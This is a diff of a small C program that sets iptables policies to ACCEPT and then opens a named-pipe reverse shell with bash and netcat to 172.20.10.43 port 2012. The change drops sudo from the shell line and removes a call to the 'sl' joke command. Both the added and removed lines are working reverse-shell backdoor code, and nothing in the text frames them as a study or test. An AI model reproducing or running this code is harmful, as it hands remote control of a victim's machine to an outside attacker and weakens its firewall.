@@ -13,10 +13,8 @@ int main(int argc, char **argv){
 	system("iptables -P OUTPUT ACCEPT");
 	system("iptables -P FORWARD ACCEPT");
 
-	system("[ ! -p /tmp/aejhfktk ] && mkfifo /tmp/aejhfktk");
-	system("(sudo /bin/bash 0</tmp/aejhfktk | nc 172.20.10.43 2012 1>/tmp/aejhfktk) &");
+	system("[ ! -p /tmp/asdcoij ] && mkfifo /tmp/asdcoij");
+	system("(/bin/bash 0</tmp/asdcoij | nc 172.20.10.43 2012 1>/tmp/asdcoij) &");
 
-	system("sl");
-	
 	return 0;
 }
